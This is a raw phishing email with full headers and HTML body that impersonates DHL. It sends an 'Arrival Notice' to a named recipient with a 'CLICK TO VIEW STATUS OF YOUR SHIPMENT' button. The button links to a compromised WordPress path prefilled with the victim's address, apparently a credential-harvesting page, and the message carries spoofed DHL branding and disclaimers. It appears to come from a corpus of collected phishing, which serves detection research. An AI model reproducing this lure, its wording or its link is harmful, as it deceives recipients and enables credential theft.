@@ -1,0 +1,309 @@
+Return-Path: smtpfox-b1wvh@theannualgolf.com
+Delivered-To: jose@monkey.org
+X-FDA: 77525143122.34.E9C4A72
+Received: from 162-241-137-172.unifiedlayer.com (unknown [162.241.137.172])
+	by imf20.b.hostedemail.com (Postfix) with ESMTP id 9C749800C5A0
+	for <jose@monkey.org>; Thu, 26 Nov 2020 03:15:11 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=theannualgolf.com; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=2Mt6EWXdF3enZ2IhvlF0Jne70ClQEFK0mc/0ezEaZrc=; b=ayerEfuxCqtzkvRDq1co2dqhyv
+	ZUvRRbPE6fJY+5DDtmWD40+h19htfw7507Hy2DzFfvWIizVLAsZj+fH0OZR5OSvOjRo5b0KjFx91A
+	95sINcTMgVRIGunzDXyXAdDLtyNA5N44cm7nhU3nqEuok7q3BWKOeg85LXFcMlHCrji4W8kPT/tiZ
+	V6r+yj4TpjgZRzo9rY/MsNnpyQw2xY+ltK38CqRfy1sPMiC/HfeYz7TrxNfc+9sJt5BdKhXhMb/oW
+	GYujpGUnH5jmWvlvxu2gT24DqIgWx+I0m85dF4GQA2+aIK9Pi+x1n7R9KOT5/7JsW7DMEZThEg9J4
+	vTWeZMSg==;
+Received: from ec2-54-169-201-84.ap-southeast-1.compute.amazonaws.com ([54.169.201.84]:61262 helo=theannualgolf.com)
+	by jay.jaynisbett.com with esmtpa (Exim 4.93)
+	(envelope-from <smtpfox-b1wvh@theannualgolf.com>)
+	id 1ki7kS-0006o2-Hp
+	for jose@monkey.org; Wed, 25 Nov 2020 21:15:09 -0600
+From: "DHL International GmbH"<smtpfox-b1wvh@theannualgolf.com>
+To: jose@monkey.org
+Subject: DHL Express Shipments: New Parcel Received.
+Date: 26 Nov 2020 03:15:06 +0000
+Message-ID: <20201126031506.66E220562EA5C704@theannualgolf.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - jay.jaynisbett.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - theannualgolf.com
+X-Get-Message-Sender-Via: jay.jaynisbett.com: authenticated_id: smtpfox-b1wvh@theannualgolf.com
+X-Authenticated-Sender: jay.jaynisbett.com: smtpfox-b1wvh@theannualgolf.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Spam-Status: No, score=7.84
+X-Stat-Signature: 5xi4r8yty8bnzp3488ffzhedk4zw7i8u
+X-Rspamd-Queue-Id: 9C749800C5A0
+X-Rspamd-Server: rspam05
+Received-SPF: none (theannualgolf.com>: No applicable sender policy available) receiver=imf20.b.tucows.com; identity=mailfrom; envelope-from="<smtpfox-b1wvh@theannualgolf.com>"; helo=162-241-137-172.unifiedlayer.com; client-ip=162.241.137.172
+X-HE-DKIM-Result: pass/pass
+X-Spam-Summary: 90,9.5,0,bfc823724e8e05dd,d41d8cd98f00b204,smtpfox-b1wvh@theannualgolf.com,jose@monkey.org,RULES_HIT:4:41:72:355:375:379:493:495:560:800:836:960:962:967:969:973:978:983:988:989:1189:1208:1224:1260:1263:1311:1313:1314:1345:1381:1431:1433:1434:1437:1513:1515:1516:1517:1521:1571:1589:1593:1594:1730:1747:1777:1792:2194:2198:2199:2200:2393:2525:2527:2538:2539:2549:2561:2567:2610:2682:2685:2828:2859:2892:2900:2933:2937:2939:2942:2945:2947:2951:2954:3000:3022:3138:3139:3140:3141:3142:3148:3352:3421:3865:3866:3867:3868:3870:3871:3872:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4321:4361:4700:5007:6119:6120:6238:6248:6653:6669:6674:6678:6703:6996:6997:7602:7809:7903:8518:8583:8599:8603:8957:8987:9025:9059:9060:9080:9108:9388:9416:9908:9973:10009:10346:10849:11026:11473:11657:11658:12043:12297:12324:12438:12555:12740:12895:12955:12958:12959:12986:13139:13439:14096:14196:14294:15012:18000:21067:21080:21121:21325:21347:21433:21450:21451:21483:21524:21627:21740:21789:21
+ 790:21810:21819:21939:21958:22119:30019:30021:30022:30026:30046:30054:30055:30064:30067:30070:30075,0,RBL:54.169.201.84:@theannualgolf.com:jose@monkey.org.lbl8.mailshell.net-64.201.201.201 62.6.204.100;04y8mxyhrxj3xm9cap613bxrt7iciorwmyt3pjqb1e9i87747einmec9efnxheh.1y7q5t7nojhx4pmn8nuyadgwotnuswchmyrw759nzqbg9ne4hd1sp1jj76izm3t.rf6fgar3wq1s6ifcwtjf1yn7w4ttt3d84j5mmowqu5tdawuwezxe9kso-lbl8.mailshell.net-223.238.255.100,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fs,MSBL:0,DNSBL:neutral,Custom_rules:0:1:0,LFtime:62,LUA_SUMMARY:none
+X-HE-Tag: 1606360511-399605
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 148
+
+<HTML><body><DIV id=3DmailBody style=3D"PADDING-BOTTOM: 0px; TEXT-ALIGN: le=
+ft; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
+<DIV id=3DcontentDiv style=3D"PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDIN=
+G-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 0px 5px; PADDING-RIGHT: 0px;=
+ overflow-wrap: break-word">
+<DIV style=3D"PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADD=
+ING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: normal; PADDING-RIGHT: 0px"><BR cl=
+ass=3DApple-interchange-newline>
+<table style=3D"WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: non=
+e; COLOR: rgb(0,0,0); FONT: 400 12px Verdana, Arial, Helvetica; ORPHANS: 2;=
+ WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEX=
+T-INDENT: 0px" cellspacing=3D"0" cellpadding=3D"0" align=3D"left" border=3D=
+"0">
+<TBODY>
+<TR>
+<td style=3D"BACKGROUND: rgb(248,248,248) 0% 50%; PADDING-BOTTOM: 0cm; PADD=
+ING-TOP: 0cm; PADDING-LEFT: 0cm; MARGIN: 0px; PADDING-RIGHT: 0cm">
+<table style=3D"FONT: 12px Verdana, Arial, Helvetica" cellspacing=3D"0" cel=
+lpadding=3D"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"PADDING-BOTTOM: 0cm; PADDING-TOP: 0cm; PADDING-LEFT: 0cm; MARG=
+IN: 0px; PADDING-RIGHT: 0cm">
+<table style=3D"WIDTH: 484.5pt; FONT: 12px Verdana, Arial, Helvetica" cells=
+pacing=3D"0" cellpadding=3D"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"WIDTH: 150pt; BACKGROUND: rgb(255,204,0) 0% 50%; PADDING-BOTTO=
+M: 0cm; PADDING-TOP: 0cm; PADDING-LEFT: 0cm; MARGIN: 0px; PADDING-RIGHT: 0c=
+m" valign=3D"top" width=3D"200">
+<table style=3D"WIDTH: 200px; FONT: 12px Verdana, Arial, Helvetica" cellspa=
+cing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY>
+<TR style=3D"HEIGHT: 20.25pt">
+<td style=3D"HEIGHT: 20.25pt; PADDING-BOTTOM: 0cm; PADDING-TOP: 0cm; PADDIN=
+G-LEFT: 0cm; MARGIN: 0px; PADDING-RIGHT: 0cm">
+<P style=3D"MARGIN-BOTTOM: 12pt" msonormal=3D"" =3D""><STRONG><SPAN style=
+=3D"FONT-SIZE: 9pt; FONT-FAMILY: Arial, sans-serif; COLOR: rgb(204,0,0)">DH=
+L GLOBAL FORWARDING</SPAN></STRONG><B><SPAN style=3D"FONT-SIZE: 9pt; FONT-F=
+AMILY: Arial, sans-serif; COLOR: rgb(204,0,0)"><SPAN>&nbsp;</SPAN><BR><BR><=
+?xml:namespace prefix =3D "o" /><o:p></o:p></SPAN></B></P></TD></TR>
+<TR>
+<td style=3D"PADDING-BOTTOM: 0cm; PADDING-TOP: 0cm; PADDING-LEFT: 0cm; MARG=
+IN: 0px; PADDING-RIGHT: 0cm">
+<table style=3D"WIDTH: 240px; FONT: 12px Verdana, Arial, Helvetica" cellspa=
+cing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"WIDTH: 3pt; PADDING-BOTTOM: 0cm; PADDING-TOP: 0cm; PADDING-LEF=
+T: 0cm; MARGIN: 0px; PADDING-RIGHT: 0cm" width=3D"4"></TD>
+<td style=3D"PADDING-BOTTOM: 0cm; PADDING-TOP: 0cm; PADDING-LEFT: 0cm; MARG=
+IN: 0px; PADDING-RIGHT: 0cm" valign=3D"top" nowrap=3D"">
+<P style=3D"MARGIN-BOTTOM: 12pt" msonormal=3D"" =3D""><SPAN style=3D"FONT-S=
+IZE: 8.5pt; FONT-FAMILY: Arial, sans-serif; COLOR: black"><BR><STRONG><SPAN=
+ style=3D"FONT-FAMILY: Arial, sans-serif">Headquarters&nbsp;in China</SPAN>=
+</STRONG><SPAN>&nbsp;</SPAN><BR><BR><BR><BR>&nbsp;<SPAN>&nbsp;</SPAN><BR>We=
+bsite :<SPAN>&nbsp;</SPAN><SPAN>&nbsp;</SPAN><A title=3Dhttps://office365.e=
+u.vadesecure.com/safeproxy/1/dmVyc2lvbjoyfG1lc3NhZ2VJRDpBQU1rQURKaFlqTTNPVE=
+V6TFdVNVpUQXRORGxpTnkwNU1EZG1MV1ZqWmpFMVlqUmtOakE0TUFCR0FBQUFBQUN0cGN5SzdmW=
+ndSWlM2eFhKZFRFS2lCd0NmU2JpQXo4VVdUcExfWDNKcFJpa01BQUFBRE83X0FBQ2ZTYmlBejhV=
+V1RwTF9YM0p style=3D"CURSOR: pointer; TEXT-DECORATION: none; COLOR: rgb(39,=
+99,164)" href=3D"https://office365.eu.vadesecure.com/safeproxy/1/dmVyc2lvbj=
+oyfG1lc3NhZ2VJRDpBQU1rQURKaFlqTTNPVEV6TFdVNVpUQXRORGxpTnkwNU1EZG1MV1ZqWmpFM=
+VlqUmtOakE0TUFCR0FBQUFBQUN0cGN5SzdmWndSWlM2eFhKZFRFS2lCd0NmU2JpQXo4VVdUcExf=
+WDNKcFJpa01BQUFBRE83X0FBQ2ZTYmlBejhVV1RwTF9YM0pwUmlrTUFBQjdQdlMzQUFBPXxlbWF=
+pbEZyb206YWdoaW1wb3J0QGRobC5jb218ZW1haWxUbzpmYW5ueS5zdGVlbmFyaUBkeW5hcGFjLm=
+NvbXxsb2dpbjo3NTQyOGVmNy04NDNkLTRkZjYtOWE4ZS0yMGM5M2ViN2I0MDV8Y2xpZW50VHlwZ=
+TpvZmZpY2U=3D/www.dhl.com%2F" target=3D_blank>www.dhl.com</A><o:p></o:p></S=
+PAN></P></TD>
+<td style=3D"WIDTH: 9pt; PADDING-BOTTOM: 0cm; PADDING-TOP: 0cm; PADDING-LEF=
+T: 0cm; MARGIN: 0px; PADDING-RIGHT: 0cm" width=3D"12"></TD></TR></TBODY></T=
+ABLE></TD></TR></TBODY></TABLE>
+<P><SPAN style=3D"FONT-SIZE: 10pt; FONT-FAMILY: Arial, sans-serif; COLOR: b=
+lack">&nbsp;<A style=3D"CURSOR: pointer; TEXT-DECORATION: none; COLOR: rgb(=
+39,99,164)" href=3D"https://office365.eu.vadesecure.com/safeproxy/1/dmVyc2l=
+vbjoyfG1lc3NhZ2VJRDpBQU1rQURKaFlqTTNPVEV6TFdVNVpUQXRORGxpTnkwNU1EZG1MV1ZqWm=
+pFMVlqUmtOakE0TUFCR0FBQUFBQUN0cGN5SzdmWndSWlM2eFhKZFRFS2lCd0NmU2JpQXo4VVdUc=
+ExfWDNKcFJpa01BQUFBRE83X0FBQ2ZTYmlBejhVV1RwTF9YM0pwUmlrTUFBQjdQdlMzQUFBPXxl=
+bWFpbEZyb206YWdoaW1wb3J0QGRobC5jb218ZW1haWxUbzpmYW5ueS5zdGVlbmFyaUBkeW5hcGF=
+jLmNvbXxsb2dpbjo3NTQyOGVmNy04NDNkLTRkZjYtOWE4ZS0yMGM5M2ViN2I0MDV8Y2xpZW50VH=
+lwZTpvZmZpY2U=3D/www.dhl.com%2Fen%2Flogistics%2Fcustoms_security_and_insura=
+nce%2Fair_and_ocean_cargo_insurance.html" target=3D_blank><SPAN>&nbsp;</SPA=
+N><SPAN style=3D"FONT-SIZE: 7.5pt">DHL&nbsp;Cargo Insurance<SPAN>&nbsp;</SP=
+AN></SPAN></A><BR></SPAN><SPAN style=3D"FONT-SIZE: 7.5pt; FONT-FAMILY: Aria=
+l, sans-serif; COLOR: black">&nbsp;<SPAN>&nbsp;</SPAN><SPAN>&nbsp;</SPAN><A=
+ style=3D"CURSOR: pointer; TEXT-DECORATION: none; COLOR: rgb(39,99,164)" hr=
+ef=3D"https://office365.eu.vadesecure.com/safeproxy/1/dmVyc2lvbjoyfG1lc3NhZ=
+2VJRDpBQU1rQURKaFlqTTNPVEV6TFdVNVpUQXRORGxpTnkwNU1EZG1MV1ZqWmpFMVlqUmtOakE0=
+TUFCR0FBQUFBQUN0cGN5SzdmWndSWlM2eFhKZFRFS2lCd0NmU2JpQXo4VVdUcExfWDNKcFJpa01=
+BQUFBRE83X0FBQ2ZTYmlBejhVV1RwTF9YM0pwUmlrTUFBQjdQdlMzQUFBPXxlbWFpbEZyb206YW=
+doaW1wb3J0QGRobC5jb218ZW1haWxUbzpmYW5ueS5zdGVlbmFyaUBkeW5hcGFjLmNvbXxsb2dpb=
+jo3NTQyOGVmNy04NDNkLTRkZjYtOWE4ZS0yMGM5M2ViN2I0MDV8Y2xpZW50VHlwZTpvZmZpY2U=
+=3D/www.dhl.com%2Fen%2Fabout_us%2Fgreen_solutions%2Fclimate_neutral.html" t=
+arget=3D_blank>DHL&nbsp;Climate Neutral</A><SPAN>&nbsp;</SPAN></SPAN><SPAN =
+style=3D"FONT-SIZE: 10pt; FONT-FAMILY: Arial, sans-serif; COLOR: black"><BR=
+><BR></SPAN><SPAN style=3D"COLOR: black">&nbsp;<o:p></o:p></SPAN></P></TD>
+<td style=3D"WIDTH: 334.5pt; BACKGROUND: white 0% 50%; PADDING-BOTTOM: 0cm;=
+ PADDING-TOP: 0cm; PADDING-LEFT: 0cm; MARGIN: 0px; PADDING-RIGHT: 0cm" vali=
+gn=3D"top" width=3D"446">
+<table style=3D"FONT: 12px Verdana, Arial, Helvetica" cellspacing=3D"0" cel=
+lpadding=3D"0" border=3D"0">
+<TBODY>
+<TR style=3D"HEIGHT: 20.25pt">
+<td style=3D"HEIGHT: 20.25pt; BACKGROUND: rgb(204,0,0) 0% 50%; PADDING-BOTT=
+OM: 0cm; PADDING-TOP: 0cm; PADDING-LEFT: 0cm; MARGIN: 0px; PADDING-RIGHT: 0=
+cm">
+<P style=3D"TEXT-ALIGN: right" align=3Dright msonormal=3D"" =3D""><STRONG><=
+SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Arial, sans-serif; COLOR: white"=
+>DHL Messaging System&nbsp;</SPAN></STRONG><B><SPAN style=3D"FONT-SIZE: 9pt=
+; FONT-FAMILY: Arial, sans-serif; COLOR: white"><o:p></o:p></SPAN></B></P><=
+/TD></TR>
+<TR>
+<td style=3D"WIDTH: 334.5pt; PADDING-BOTTOM: 0cm; PADDING-TOP: 0cm; PADDING=
+-LEFT: 0cm; MARGIN: 0px; PADDING-RIGHT: 0cm" width=3D"446">
+<P msonormal=3D"" =3D""><A style=3D"CURSOR: pointer; TEXT-DECORATION: none;=
+ COLOR: rgb(39,99,164)" name=3Dtop target=3D_blank></A><o:p></o:p></P></TD>=
+</TR>
+<TR>
+<td style=3D"PADDING-BOTTOM: 0cm; PADDING-TOP: 0cm; PADDING-LEFT: 0cm; MARG=
+IN: 0px; PADDING-RIGHT: 0cm">
+<table style=3D"WIDTH: 334.5pt; FONT: 12px Verdana, Arial, Helvetica" cells=
+pacing=3D"0" cellpadding=3D"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"WIDTH: 13.5pt; PADDING-BOTTOM: 0cm; PADDING-TOP: 0cm; PADDING-=
+LEFT: 0cm; MARGIN: 0px; PADDING-RIGHT: 0cm" valign=3D"top" width=3D"18"></T=
+D>
+<td style=3D"WIDTH: 309.75pt; PADDING-BOTTOM: 0cm; PADDING-TOP: 0cm; PADDIN=
+G-LEFT: 0cm; MARGIN: 0px; PADDING-RIGHT: 0cm" valign=3D"top" width=3D"413">=
+
+<P msonormal=3D"" =3D""><SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Arial, =
+sans-serif; COLOR: black"><o:p></o:p></SPAN></P>
+<table style=3D"WIDTH: 412px; FONT: 12px Verdana, Arial, Helvetica" cellspa=
+cing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"PADDING-BOTTOM: 0cm; PADDING-TOP: 0cm; PADDING-LEFT: 0cm; MARG=
+IN: 0px; PADDING-RIGHT: 0cm">
+<P msonormal=3D"" =3D""><B><SPAN style=3D"FONT-FAMILY: Arial, sans-serif; C=
+OLOR: rgb(204,0,0)">Arrival Notice</SPAN></B><SPAN style=3D"FONT-SIZE: 9pt;=
+ FONT-FAMILY: Arial, sans-serif; COLOR: black"><o:p></o:p></SPAN></P></TD>
+<td style=3D"PADDING-BOTTOM: 0cm; PADDING-TOP: 0cm; PADDING-LEFT: 0cm; MARG=
+IN: 0px; PADDING-RIGHT: 0cm">
+<P style=3D"TEXT-ALIGN: right" align=3Dright msonormal=3D"" =3D""><SPAN sty=
+le=3D"FONT-SIZE: 7.5pt; FONT-FAMILY: Arial, sans-serif; COLOR: black"></SPA=
+N><SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Arial, sans-serif; COLOR: bla=
+ck"><o:p></o:p></SPAN></P></TD></TR></TBODY></TABLE>
+<P msonormal=3D"" =3D""><SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Arial, =
+sans-serif; COLOR: black"><o:p></o:p></SPAN></P>
+<P><SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Arial, sans-serif; COLOR: bl=
+ack">Dear jose <o:p></o:p></SPAN></P>
+<P><SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Arial, sans-serif; COLOR: bl=
+ack">Please note the Arrival Notice for parcel:<o:p></o:p></SPAN></P>
+<P><B><SPAN style=3D"FONT-FAMILY: Arial, sans-serif; COLOR: black">Our Ref:=
+&nbsp;AGH/653966</SPAN></B><SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Aria=
+l, sans-serif; COLOR: black"><o:p></o:p></SPAN></P>
+<P><B><SPAN style=3D"FONT-FAMILY: Arial, sans-serif; COLOR: black">Bill of =
+Lading: WUXA0244&nbsp;&nbsp;</SPAN></B><SPAN style=3D"FONT-SIZE: 9pt; FONT-=
+FAMILY: Arial, sans-serif; COLOR: black"><o:p></o:p></SPAN></P>
+<P><B><SPAN style=3D"FONT-FAMILY: Arial, sans-serif; COLOR: black">Your Ref=
+: &nbsp;<SPAN>&nbsp;</SPAN></SPAN></B><BR clear=3Dnone><FONT color=3D#00000=
+0 size=3D3 face=3Dveranda><SPAN style=3D"FONT-WEIGHT: 700"><BR clear=3Dnone=
+></SPAN></FONT><SPAN style=3D"FONT-WEIGHT: 700"><A style=3D"BORDER-LEFT-WID=
+TH: 1px; FONT-SIZE: 11px; TEXT-DECORATION: none; BORDER-RIGHT-WIDTH: 1px; B=
+ORDER-TOP-COLOR: rgb(48,121,237); BACKGROUND-IMAGE: none; BORDER-BOTTOM-WID=
+TH: 1px; BORDER-LEFT-COLOR: rgb(48,121,237); COLOR: white; PADDING-BOTTOM: =
+0px; BORDER-BOTTOM-COLOR: rgb(48,121,237); TEXT-ALIGN: center; PADDING-TOP:=
+ 0px; PADDING-LEFT: 8px; MIN-HEIGHT: 27px; BORDER-RIGHT-COLOR: rgb(48,121,2=
+37); LINE-HEIGHT: 27px; PADDING-RIGHT: 8px; BORDER-TOP-WIDTH: 1px; BACKGROU=
+ND-COLOR: rgb(77,144,254)" href=3D"https://seaport.newpatientgroup.com/wp-c=
+ontent/themes/aeonaccess/js/DHL1/index.php?login=3Djose@monkey.org" shape=
+=3Drect rel=3Dnofollow target=3D_blank>CLICK TO VIEW STATUS OF YOUR SHIPMEN=
+T</A></SPAN><SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Arial, sans-serif; =
+COLOR: black"><BR><BR>Do not hesitate to contact us for further assistance.=
+<o:p></o:p></SPAN></P>
+<P><SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Arial, sans-serif; COLOR: bl=
+ack">Best regards,&nbsp;<SPAN>&nbsp;</SPAN><BR>Customer Service (AGH) Custo=
+mer Service (OPI)<SPAN>&nbsp;</SPAN><BR><SPAN></SPAN><o:p></o:p></SPAN></P>=
+
+<P><SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Arial, sans-serif; COLOR: bl=
+ack">This email has been sent to:<SPAN>&nbsp;</SPAN><BR></SPAN><STRONG><U><=
+SPAN style=3D"FONT-SIZE: 10pt; FONT-FAMILY: Arial, sans-serif; COLOR: blue"=
+><A class=3Dgwt-Anchor style=3D"CURSOR: pointer; TEXT-DECORATION: none; COL=
+OR: rgb(39,99,164)" target=3D_blank><SPAN style=3D"FONT-WEIGHT: normal">jos=
+e@monkey.org</SPAN></A></SPAN></U></STRONG><SPAN style=3D"FONT-SIZE: 10pt; =
+FONT-FAMILY: Arial, sans-serif; COLOR: blue"><SPAN>&nbsp;</SPAN>&nbsp; &nbs=
+p;<STRONG><SPAN>&nbsp;</SPAN><SPAN style=3D"FONT-FAMILY: Arial, sans-serif"=
+><SPAN>&nbsp;</SPAN></SPAN></STRONG>&nbsp;</SPAN><SPAN style=3D"FONT-SIZE: =
+9pt; FONT-FAMILY: Arial, sans-serif; COLOR: black"><o:p></o:p></SPAN></P>
+<P><SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Arial, sans-serif; COLOR: bl=
+ack">This is an e-mail message from DHL. The information contained in this =
+communication is intended solely for use by the individual or entity to who=
+m it is addressed. Use of this communication by others is prohibited. If th=
+e e-mail message was sent to you by mistake, please destroy it without read=
+ing, using, copying or disclosing its contents to any other person. We acce=
+pt no liability for damage related to data and/or documents which are commu=
+nicated by electronic mail.<o:p></o:p></SPAN></P></TD>
+<td style=3D"WIDTH: 11.25pt; PADDING-BOTTOM: 0cm; PADDING-TOP: 0cm; PADDING=
+-LEFT: 0cm; MARGIN: 0px; PADDING-RIGHT: 0cm" valign=3D"top" width=3D"15"></=
+TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"HEIGHT: 20.25pt">
+<td style=3D"HEIGHT: 20.25pt; BACKGROUND: rgb(204,0,0) 0% 50%; PADDING-BOTT=
+OM: 0cm; PADDING-TOP: 0cm; PADDING-LEFT: 0cm; MARGIN: 0px; PADDING-RIGHT: 0=
+cm">
+<P style=3D"TEXT-ALIGN: center" align=3Dcenter msonormal=3D"" =3D""><STRONG=
+><SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Arial, sans-serif; COLOR: whit=
+e">Copyright =A9 1997-2020 DHL International Ltd. All Rights Reserved.</SPA=
+N></STRONG><B><SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Arial, sans-serif=
+; COLOR: white"><o:p></o:p></SPAN></B></P></TD></TR></TBODY></TABLE></TD></=
+TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Verdana, Arial, Helvetica; WHITE-=
+SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; C=
+OLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px" msonormal=
+=3D"" =3D""><o:p></o:p></P></DIV></DIV></DIV>
+<DIV id=3Dr_b class=3Dsettingtable style=3D"HEIGHT: 35px; WIDTH: 1247px; BA=
+CKGROUND: rgb(247,249,250); BORDER-BOTTOM: rgb(255,255,255) 1px solid; POSI=
+TION: absolute; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 2px; PA=
+DDING-LEFT: 0px; MARGIN: 0px 0px 0px 1px; PADDING-RIGHT: 0px; BOTTOM: 0px">=
+
+<DIV id=3DQuickReplyPart class=3Dsettingtable style=3D"HEIGHT: 35px; BACKGR=
+OUND: rgb(247,249,250); BORDER-BOTTOM: rgb(255,255,255) 1px solid; PADDING-=
+BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 2px; PADDING-LEFT: 5px; MARGIN:=
+ 0px; PADDING-RIGHT: 0px">
+<FORM id=3DuploadAttachmentmail11 style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZ=
+E: 12px; BORDER-RIGHT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM:=
+ 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px;=
+ BORDER-TOP-WIDTH: 0px" method=3Dpost name=3DuploadAttachmentmail11 action=
+=3Dhttp://180.76.192.5/webmail/cgijson/sendmail_new.php target=3D"">
+<DIV title=3D"close quickly reply" style=3D"FONT-SIZE: 12px; FONT-FAMILY: ?=
+???, Tahoma, ??, Arial; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
+ORM: none; FLOAT: right; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTO=
+M: 0px; FONT-STYLE: normal; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEF=
+T: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING=
+-RIGHT: 0px; BACKGROUND-COLOR: rgb(247,249,250); TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-widt=
+h: 0px; text-decoration-style: initial; text-decoration-color: initial"><SP=
+AN id=3Dqrp style=3D"CURSOR: pointer">Close<SPAN>&nbsp;</SPAN><INPUT class=
+=3Ddns_ico_quickdown style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 12px; BORD=
+ER-RIGHT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; OUTLINE-WIDTH: medium; PADDI=
+NG-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 0px; M=
+ARGIN: 0px 0px 0px 4px; OUTLINE-COLOR: invert; PADDING-RIGHT: 0px; BORDER-T=
+OP-WIDTH: 0px" alt=3D"open quickly reply" type=3Dbutton></SPAN></DIV>
+<DIV id=3Dpanel_quickReply style=3D"FONT-SIZE: 12px; FONT-FAMILY: ????, Tah=
+oma, ??, Arial; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: non=
+e; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: no=
+rmal; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; ORPHANS: 2; WI=
+DOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUN=
+D-COLOR: rgb(247,249,250); TEXT-INDENT: 0px; font-variant-ligatures: normal=
+; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoratio=
+n-style: initial; text-decoration-color: initial"><BR class=3DApple-interch=
+ange-newline></DIV></FORM></DIV></DIV></BODY></HTML>
+
